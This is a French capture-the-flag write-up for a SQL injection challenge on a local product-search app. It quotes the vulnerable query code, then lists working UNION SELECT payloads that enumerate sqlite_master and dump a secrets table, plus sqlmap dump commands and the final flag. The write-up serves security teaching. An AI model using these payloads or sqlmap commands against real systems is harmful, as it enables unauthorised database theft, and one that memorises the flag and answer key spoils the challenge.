# Challenge 1: SQL Injection - Writeup

## Analyse du challenge

L'application est un moteur de recherche de produits qui permet de rechercher des produits par nom. Le paramètre `q` dans l'endpoint `/search` est directement inséré dans une requête SQL sans sanitisation.

## Détection de la vulnérabilité

En examinant le code source dans `app.py`, ligne 58:

```python
sql = f"SELECT id, name, category, price FROM products WHERE name LIKE '%{query}%'"
```

La variable `query` est directement interpolée dans la requête SQL sans échappement, ce qui permet une injection SQL.

## Exploitation

### Étape 1: Confirmer la vulnérabilité

Tester avec une simple injection:

```
http://localhost:5000/search?q=test' OR '1'='1
```

Cela devrait retourner tous les produits car la condition devient toujours vraie.

### Étape 2: Identifier la structure de la base

Pour dumper la base de données, nous devons d'abord identifier les tables. Utilisons UNION SELECT:

```
http://localhost:5000/search?q=' UNION SELECT 1,2,3,4--
```

Si cela fonctionne, nous pouvons extraire des informations des tables système SQLite.

### Étape 3: Lister les tables

SQLite stocke les métadonnées dans `sqlite_master`:

```
http://localhost:5000/search?q=' UNION SELECT name,type,sql,NULL FROM sqlite_master WHERE type='table'--
```

Cela devrait révéler les tables `products` et `secrets`.

### Étape 4: Dumper la table secrets

Une fois que nous savons qu'il existe une table `secrets` avec un champ `flag`, nous pouvons la lire:

```
http://localhost:5000/search?q=' UNION SELECT id,flag,NULL,NULL FROM secrets--
```

## Payload final

Pour récupérer directement le flag:

```
http://localhost:5000/search?q=' UNION SELECT id,flag,NULL,NULL FROM secrets--
```


## Solution alternative avec sqlmap

```bash
sqlmap -u "http://localhost:5000/search?q=test" --dbs
sqlmap -u "http://localhost:5000/search?q=test" -D database --tables
sqlmap -u "http://localhost:5000/search?q=test" -D database -T secrets --dump
```

## Flag

Le flag est affiché dans les résultats de recherche sous la colonne "Name":
`FLAG{SQLi_Dump_Success_2024}`

